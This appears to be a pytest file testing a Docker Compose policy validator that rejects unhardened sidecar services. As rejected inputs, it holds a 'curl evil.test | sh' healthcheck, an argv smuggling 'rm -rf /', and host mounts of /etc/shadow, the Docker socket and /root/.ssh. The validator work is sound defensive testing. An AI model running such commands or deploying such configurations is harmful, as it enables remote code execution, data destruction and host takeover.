"""Role-specific policy for declared auxiliary Compose services."""

from __future__ import annotations

from typing import Any

import pytest
from pydantic import ValidationError

from genefoundry_router.release.compose import validate_compose
from genefoundry_router.release.compose_policy import AuxiliaryServiceRule, ComposePolicy
from genefoundry_router.release.models import AuxiliaryServiceConfig

_IMAGE = f"ghcr.io/acme/app@sha256:{'a' * 64}"
_DATABASE_IMAGE = f"docker.io/library/postgres@sha256:{'b' * 64}"
_HEALTH = ("CMD", "true")
_DATABASE_HEALTH = ("CMD-SHELL", "pg_isready")
_LIMITS: dict[str, object] = {"cpus": 1, "memory": "1073741824", "pids": 256}
_LOGGING: dict[str, object] = {
    "driver": "json-file",
    "options": {"max-size": "50m", "max-file": "5"},
}


def _init_service() -> dict[str, Any]:
    return {
        "image": _IMAGE,
        "pull_policy": "missing",
        "restart": "no",
        "read_only": True,
        "command": ["app", "materialize-data"],
        "entrypoint": None,
        "network_mode": "none",
        "cap_drop": ["ALL"],
        "security_opt": ["no-new-privileges:true"],
        "tmpfs": ["/tmp/app:rw,noexec,nosuid,size=16m"],  # noqa: S108
        "volumes": [{"type": "volume", "source": "reference", "target": "/var/lib/app/reference"}],
        "deploy": {"resources": {"limits": dict(_LIMITS)}},
        "logging": dict(_LOGGING),
    }


def _database_service() -> dict[str, Any]:
    return {
        "image": _DATABASE_IMAGE,
        "pull_policy": "missing",
        "restart": "on-failure",
        "read_only": True,
        "cap_drop": ["ALL"],
        "security_opt": ["no-new-privileges:true"],
        "networks": {"default": None},
        "tmpfs": ["/tmp:rw,noexec,nosuid,size=16m"],  # noqa: S108
        "volumes": [{"type": "volume", "source": "pgdata", "target": "/var/lib/postgresql"}],
        "deploy": {"resources": {"limits": dict(_LIMITS)}},
        "logging": dict(_LOGGING),
        "healthcheck": {
            "test": list(_DATABASE_HEALTH),
            "interval": "30s",
            "timeout": "10s",
            "retries": 3,
        },
    }


@pytest.fixture
def rendered() -> dict[str, Any]:
    return {
        "name": "app",
        "services": {
            "app": {
                "image": _IMAGE,
                "pull_policy": "missing",
                "restart": "on-failure",
                "read_only": True,
                "init": True,
                "expose": ["8000"],
                "cap_drop": ["ALL"],
                "security_opt": ["no-new-privileges:true"],
                "tmpfs": ["/tmp:rw,noexec,nosuid,size=64m"],  # noqa: S108
                "volumes": [{"type": "volume", "source": "data", "target": "/data"}],
                "networks": {"default": None},
                "depends_on": {
                    "app-init": {"condition": "service_completed_successfully", "required": True}
                },
                "deploy": {"resources": {"limits": dict(_LIMITS)}},
                "logging": dict(_LOGGING),
                "healthcheck": {
                    "test": list(_HEALTH),
                    "interval": "30s",
                    "timeout": "10s",
                    "retries": 3,
                },
            },
            "app-init": _init_service(),
        },
        "volumes": {
            "data": {"name": "app_data"},
            "reference": {"name": "app_reference"},
        },
        "networks": {"default": {"name": "app_default", "ipam": {}}},
    }


def _init_rule(**overrides: Any) -> AuxiliaryServiceRule:
    fields: dict[str, Any] = {
        "name": "app-init",
        "role": "init",
        "egress": "denied",
        "writable_targets": frozenset({"/tmp/app", "/var/lib/app/reference"}),  # noqa: S108
    }
    return AuxiliaryServiceRule(**(fields | overrides))


def _policy(*rules: AuxiliaryServiceRule) -> ComposePolicy:
    return ComposePolicy(healthcheck_test=_HEALTH, auxiliary_services=rules or (_init_rule(),))


# --- the declared, fully validated happy path -----------------------------------------------


def test_declared_init_sidecar_validates_clean(rendered: dict[str, Any]) -> None:
    assert validate_compose(rendered, "app", _policy()) == ()


def test_undeclared_sidecar_still_requires_a_role_policy(rendered: dict[str, Any]) -> None:
    rendered["services"]["rogue"] = {"image": _IMAGE}

    violations = validate_compose(rendered, "app", _policy())

    assert any(
        violation.startswith("services.rogue:") and "explicit role-specific policy" in violation
        for violation in violations
    )


def test_declaring_a_name_does_not_authorize_an_unvalidated_sidecar(
    rendered: dict[str, Any],
) -> None:
    """Approving a service NAME must never authorize an unhardened sidecar."""
    rendered["services"]["app-init"] = {
        "image": _IMAGE,
        "privileged": True,
        "network_mode": "host",
        "user": "0",
        "volumes": ["/:/host", "/var/run/docker.sock:/var/run/docker.sock"],
    }

    violations = validate_compose(rendered, "app", _policy())

    assert violations
    assert all(violation.startswith("services.app-init") for violation in violations)
    assert any("privileged" in violation for violation in violations)
    assert any(
        "docker.sock" in violation or "Docker socket" in violation for violation in violations
    )


# --- hardening invariants hold for sidecars too ----------------------------------------------


@pytest.mark.parametrize(
    ("field", "value", "fragment"),
    [
        ("read_only", False, "read_only"),
        ("cap_drop", [], "cap_drop"),
        ("cap_drop", ["ALL", "NET_ADMIN"], "cap_drop"),
        ("security_opt", [], "security_opt"),
        ("security_opt", ["seccomp:unconfined"], "security_opt"),
        ("privileged", True, "privileged"),
        ("user", "0", "user"),
        ("pids_limit", 256, "pids_limit"),
        ("container_name", "app-init-1", "container_name"),
        ("pid", "host", "pid"),
        ("image", "acme/app:latest", "image"),
        ("pull_policy", "always", "pull_policy"),
        ("restart", "always", "restart"),
        ("ports", ["127.0.0.1:5432:5432"], "ports"),
        ("cap_add", ["SYS_ADMIN"], "cap_add"),
        ("use_api_socket", True, "use_api_socket"),
    ],
)
def test_init_sidecar_hardening_invariants(
    rendered: dict[str, Any], field: str, value: object, fragment: str
) -> None:
    rendered["services"]["app-init"][field] = value

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith(f"services.app-init.{fragment}") for violation in violations), (
        violations
    )


@pytest.mark.parametrize("field", ["deploy", "logging"])
def test_init_sidecar_requires_resource_and_log_bounds(
    rendered: dict[str, Any], field: str
) -> None:
    del rendered["services"]["app-init"][field]

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith(f"services.app-init.{field}") for violation in violations)


def test_init_sidecar_rejects_unbounded_resource_limits(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["deploy"] = {
        "resources": {"limits": {"cpus": 1, "memory": "0", "pids": 256}}
    }

    violations = validate_compose(rendered, "app", _policy())

    assert any(
        violation.startswith("services.app-init.deploy.resources.limits.memory")
        for violation in violations
    )


def test_init_sidecar_rejects_a_build_stanza(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["build"] = {"context": ".."}

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.build") for violation in violations)


# --- the init role identity -------------------------------------------------------------------


def test_init_sidecar_requires_an_explicit_process(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["command"] = None

    violations = validate_compose(rendered, "app", _policy())

    assert any("explicit argv" in violation for violation in violations)


@pytest.mark.parametrize(
    "argv",
    [
        "app materialize-data",
        ["app", "materialize-data; rm -rf /"],
        ["app", 1],
        [],
        ["app", "x" * 5_000],
    ],
)
def test_init_sidecar_process_must_be_a_bounded_argv_list(
    rendered: dict[str, Any], argv: object
) -> None:
    rendered["services"]["app-init"]["command"] = argv

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.command") for violation in violations)


def test_init_sidecar_must_not_restart(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["restart"] = "on-failure"

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.restart") for violation in violations)


def test_init_sidecar_may_not_serve_traffic(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["expose"] = ["8000"]

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.expose") for violation in violations)


def test_init_sidecar_requires_writable_reference_storage(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["volumes"] = []

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.volumes") for violation in violations)


def test_init_sidecar_writable_target_must_be_declared(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["volumes"] = [
        {"type": "volume", "source": "reference", "target": "/undeclared"}
    ]

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.volumes[0]") for violation in violations)


# --- egress: the restored-database init must be network-denied --------------------------------


def test_egress_denied_init_requires_network_mode_none(rendered: dict[str, Any]) -> None:
    del rendered["services"]["app-init"]["network_mode"]
    rendered["services"]["app-init"]["networks"] = {"default": None}

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.network_mode") for violation in violations)


def test_egress_denied_init_may_not_attach_networks(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["networks"] = {"default": None}

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.networks") for violation in violations)


def test_networked_init_may_attach_an_approved_network(rendered: dict[str, Any]) -> None:
    service = rendered["services"]["app-init"]
    del service["network_mode"]
    service["networks"] = {"default": None}

    violations = validate_compose(rendered, "app", _policy(_init_rule(egress="approved-networks")))

    assert violations == ()


def test_networked_init_may_not_use_network_mode(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["network_mode"] = "host"

    violations = validate_compose(rendered, "app", _policy(_init_rule(egress="approved-networks")))

    assert any(violation.startswith("services.app-init.network_mode") for violation in violations)


def test_networked_init_may_not_attach_an_unapproved_network(rendered: dict[str, Any]) -> None:
    service = rendered["services"]["app-init"]
    del service["network_mode"]
    service["networks"] = {"rogue": None}

    violations = validate_compose(rendered, "app", _policy(_init_rule(egress="approved-networks")))

    assert any(violation.startswith("services.app-init.networks") for violation in violations)


def test_internal_egress_init_requires_an_internal_network(rendered: dict[str, Any]) -> None:
    """A restore init reaches the database but never the internet."""
    service = rendered["services"]["app-init"]
    del service["network_mode"]
    service["networks"] = {"database": None}
    rendered["services"]["app"]["networks"] = {"default": None, "database": None}
    rendered["networks"]["database"] = {"name": "app_database", "internal": True, "ipam": {}}
    policy = ComposePolicy(
        healthcheck_test=_HEALTH,
        approved_networks=frozenset({"default", "database"}),
        internal_networks=frozenset({"database"}),
        auxiliary_services=(_init_rule(egress="internal"),),
    )

    assert validate_compose(rendered, "app", policy) == ()


def test_internal_egress_init_rejects_an_internet_facing_network(
    rendered: dict[str, Any],
) -> None:
    service = rendered["services"]["app-init"]
    del service["network_mode"]
    service["networks"] = {"default": None}
    policy = ComposePolicy(
        healthcheck_test=_HEALTH,
        auxiliary_services=(_init_rule(egress="internal"),),
    )

    violations = validate_compose(rendered, "app", policy)

    assert any(violation.startswith("services.app-init.networks") for violation in violations)


# --- read-only seed bind mounts ----------------------------------------------------------------


def test_init_rejects_a_bind_mount_without_a_declared_seed_target(
    rendered: dict[str, Any],
) -> None:
    rendered["services"]["app-init"]["volumes"].append(
        {"type": "bind", "source": "/seed/app.zst", "target": "/seed/app.zst", "read_only": True}
    )

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app-init.volumes[1]") for violation in violations)


def test_init_accepts_a_read_only_declared_seed_bind(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["volumes"].append(
        {"type": "bind", "source": "/seed/app.zst", "target": "/seed/app.zst", "read_only": True}
    )
    rule = _init_rule(read_only_targets=frozenset({"/seed/app.zst"}))

    assert validate_compose(rendered, "app", _policy(rule)) == ()


def test_init_rejects_a_writable_seed_bind(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["volumes"].append(
        {"type": "bind", "source": "/seed/app.zst", "target": "/seed/app.zst"}
    )
    rule = _init_rule(read_only_targets=frozenset({"/seed/app.zst"}))

    violations = validate_compose(rendered, "app", _policy(rule))

    assert any(violation.startswith("services.app-init.volumes[1]") for violation in violations)


@pytest.mark.parametrize(
    "source",
    ["/", "/etc", "/etc/shadow", "/var/run/docker.sock", "/proc/1", "/root/.ssh", "relative"],
)
def test_init_rejects_a_dangerous_seed_bind_source(rendered: dict[str, Any], source: str) -> None:
    rendered["services"]["app-init"]["volumes"].append(
        {"type": "bind", "source": source, "target": "/seed/app.zst", "read_only": True}
    )
    rule = _init_rule(read_only_targets=frozenset({"/seed/app.zst"}))

    violations = validate_compose(rendered, "app", _policy(rule))

    assert any(violation.startswith("services.app-init.volumes[1]") for violation in violations)


# --- the database role ---------------------------------------------------------------------------


def _database_rendered(rendered: dict[str, Any]) -> dict[str, Any]:
    rendered["services"]["database"] = _database_service()
    rendered["services"]["app"]["depends_on"]["database"] = {
        "condition": "service_healthy",
        "required": True,
    }
    rendered["volumes"]["pgdata"] = {"name": "app_pgdata"}
    return rendered


def _database_rule(**overrides: Any) -> AuxiliaryServiceRule:
    fields: dict[str, Any] = {
        "name": "database",
        "role": "database",
        "egress": "approved-networks",
        "writable_targets": frozenset({"/tmp", "/var/lib/postgresql"}),  # noqa: S108
        "healthcheck_test": _DATABASE_HEALTH,
    }
    return AuxiliaryServiceRule(**(fields | overrides))


def test_declared_database_sidecar_validates_clean(rendered: dict[str, Any]) -> None:
    policy = _policy(_init_rule(), _database_rule())

    assert validate_compose(_database_rendered(rendered), "app", policy) == ()


def test_database_sidecar_requires_a_healthcheck(rendered: dict[str, Any]) -> None:
    document = _database_rendered(rendered)
    del document["services"]["database"]["healthcheck"]

    violations = validate_compose(document, "app", _policy(_init_rule(), _database_rule()))

    assert any(violation.startswith("services.database.healthcheck") for violation in violations)


def test_database_sidecar_healthcheck_must_match_the_declared_probe(
    rendered: dict[str, Any],
) -> None:
    document = _database_rendered(rendered)
    document["services"]["database"]["healthcheck"]["test"] = ["CMD-SHELL", "curl evil.test | sh"]

    violations = validate_compose(document, "app", _policy(_init_rule(), _database_rule()))

    assert any(violation.startswith("services.database.healthcheck") for violation in violations)


def test_database_sidecar_may_not_publish_a_host_port(rendered: dict[str, Any]) -> None:
    document = _database_rendered(rendered)
    document["services"]["database"]["ports"] = ["127.0.0.1:5432:5432"]

    violations = validate_compose(document, "app", _policy(_init_rule(), _database_rule()))

    assert any(violation.startswith("services.database.ports") for violation in violations)


def test_database_sidecar_requires_a_digest_pinned_image(rendered: dict[str, Any]) -> None:
    document = _database_rendered(rendered)
    document["services"]["database"]["image"] = "pgvector/pgvector:0.8.2-pg18"

    violations = validate_compose(document, "app", _policy(_init_rule(), _database_rule()))

    assert any(violation.startswith("services.database.image") for violation in violations)


def test_database_sidecar_must_not_be_declared_network_denied(rendered: dict[str, Any]) -> None:
    document = _database_rendered(rendered)
    policy = _policy(_init_rule(), _database_rule(egress="denied"))

    violations = validate_compose(document, "app", policy)

    assert any(violation.startswith("services.database") for violation in violations)


# --- depends_on is the only sanctioned application coupling -------------------------------------


def test_application_may_depend_on_a_declared_auxiliary_service(
    rendered: dict[str, Any],
) -> None:
    assert validate_compose(rendered, "app", _policy()) == ()


def test_application_may_not_depend_on_an_undeclared_service(rendered: dict[str, Any]) -> None:
    rendered["services"]["app"]["depends_on"]["rogue"] = {"condition": "service_started"}

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app.depends_on") for violation in violations)


@pytest.mark.parametrize("condition", ["service_started", "service_healthy", "nonsense"])
def test_init_dependency_requires_successful_completion(
    rendered: dict[str, Any], condition: str
) -> None:
    rendered["services"]["app"]["depends_on"]["app-init"]["condition"] = condition

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app.depends_on.app-init") for violation in violations)


def test_database_dependency_requires_a_healthy_condition(rendered: dict[str, Any]) -> None:
    document = _database_rendered(rendered)
    document["services"]["app"]["depends_on"]["database"]["condition"] = "service_started"

    violations = validate_compose(document, "app", _policy(_init_rule(), _database_rule()))

    assert any(violation.startswith("services.app.depends_on.database") for violation in violations)


def test_optional_dependency_is_rejected(rendered: dict[str, Any]) -> None:
    rendered["services"]["app"]["depends_on"]["app-init"]["required"] = False

    violations = validate_compose(rendered, "app", _policy())

    assert any(violation.startswith("services.app.depends_on.app-init") for violation in violations)


def test_a_declared_auxiliary_service_must_be_present(rendered: dict[str, Any]) -> None:
    del rendered["services"]["app-init"]
    del rendered["services"]["app"]["depends_on"]

    violations = validate_compose(rendered, "app", _policy())

    assert any(
        violation.startswith("services.app-init") and "must exist" in violation
        for violation in violations
    )


def test_auxiliary_rules_may_not_shadow_the_application(rendered: dict[str, Any]) -> None:
    violations = validate_compose(rendered, "app", _policy(_init_rule(name="app")))

    assert any("must not name the application service" in violation for violation in violations)


def test_an_orphan_sidecar_nothing_depends_on_is_rejected(rendered: dict[str, Any]) -> None:
    """Compose would never start it, so it could never gate the application."""
    del rendered["services"]["app"]["depends_on"]

    violations = validate_compose(rendered, "app", _policy())

    assert any(
        violation == "services.app-init: a declared auxiliary service must be depended upon"
        for violation in violations
    )


def test_a_sidecar_may_wait_on_another_declared_sidecar(rendered: dict[str, Any]) -> None:
    """A restore init reaches its database but never the internet."""
    document = _database_rendered(rendered)
    document["services"]["app-init"]["depends_on"] = {
        "database": {"condition": "service_healthy", "required": True}
    }
    del document["services"]["app"]["depends_on"]["database"]

    assert validate_compose(document, "app", _policy(_init_rule(), _database_rule())) == ()


def test_a_sidecar_may_not_wait_on_an_undeclared_service(rendered: dict[str, Any]) -> None:
    rendered["services"]["app-init"]["depends_on"] = {"rogue": {"condition": "service_started"}}

    violations = validate_compose(rendered, "app", _policy())

    assert any(
        violation.startswith("services.app-init.depends_on.rogue") for violation in violations
    )


def test_database_role_accepts_a_declared_non_root_user() -> None:
    """A database sidecar must be able to declare a non-root user.

    The official postgres/pgvector entrypoint starts as root and gosu-drops to `postgres`,
    which needs CAP_SETUID/CAP_SETGID/CAP_CHOWN. Under the mandatory `cap_drop: [ALL]` that
    drop fails with "operation not permitted", so forbidding `user` outright made the
    database role unsatisfiable by every real postgres image. Declaring the image's own
    uid:gid skips the root entrypoint path entirely and is strictly MORE hardened: the
    container starts non-root and still keeps cap_drop ALL.
    """
    config = AuxiliaryServiceConfig(
        name="pubtator-postgres",
        role="database",
        egress="approved-networks",
        writable_targets=("/var/lib/postgresql", "/var/run/postgresql"),
        healthcheck_test=("CMD-SHELL", "pg_isready -U postgres"),
        user="999:999",
    )

    assert config.user == "999:999"


@pytest.mark.parametrize("value", ["0:0", "root", "0:999", "999:0", "999", "999:999:999"])
def test_declared_user_must_be_a_non_root_uid_gid(value: str) -> None:
    """Never let a sidecar declare root, or a free-form name we cannot reason about."""
    with pytest.raises(ValidationError):
        AuxiliaryServiceConfig(
            name="pubtator-postgres",
            role="database",
            egress="approved-networks",
            writable_targets=("/var/lib/postgresql",),
            healthcheck_test=("CMD-SHELL", "pg_isready"),
            user=value,
        )
